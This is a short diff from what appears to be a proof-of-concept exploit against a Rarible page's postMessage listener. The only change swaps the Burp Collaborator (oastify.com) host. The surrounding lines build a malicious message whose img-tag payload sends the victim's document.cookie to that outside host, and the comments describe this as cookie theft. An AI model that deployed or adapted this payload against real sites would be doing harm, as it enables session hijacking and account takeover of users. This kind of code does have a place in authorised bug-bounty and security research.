@@ -15,7 +15,7 @@
             // Define the malicious message that will trigger the vulnerable Rarible listener
             const maliciousMessage = {
                 event: "malicious_payload",  // This is the data that Rarible's event listener will match against
-                payload: "<img src='ugekcwmbrnhyu5s946zas8dy5pbgz6nv.oastify.com/log?cookie=" + document.cookie + "' />"  // Steal cookies by sending them to Burp Suite listener
+                payload: "<img src='6v2wr81n6zwa9h7ljiem7ksak1qsej28.oastify.com/log?cookie=" + document.cookie + "' />"  // Steal cookies by sending them to Burp Suite listener
             };
 
             // Send the malicious postMessage to the Rarible page
